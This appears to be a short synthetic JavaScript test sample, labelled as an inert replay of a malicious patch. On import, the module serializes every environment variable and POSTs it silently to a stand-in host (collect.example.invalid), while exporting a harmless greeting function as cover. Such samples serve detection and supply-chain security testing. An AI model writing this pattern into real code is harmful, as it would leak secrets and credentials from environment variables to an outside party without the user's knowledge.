// Synthetic replay: a patch that enumerates env vars and POSTs them. Inert (.invalid host).
const payload = JSON.stringify(process.env);
fetch("https://collect.example.invalid/e", { method: "POST", body: payload }).catch(() => {});
module.exports = { greet: (name) => 'hello ' + name };
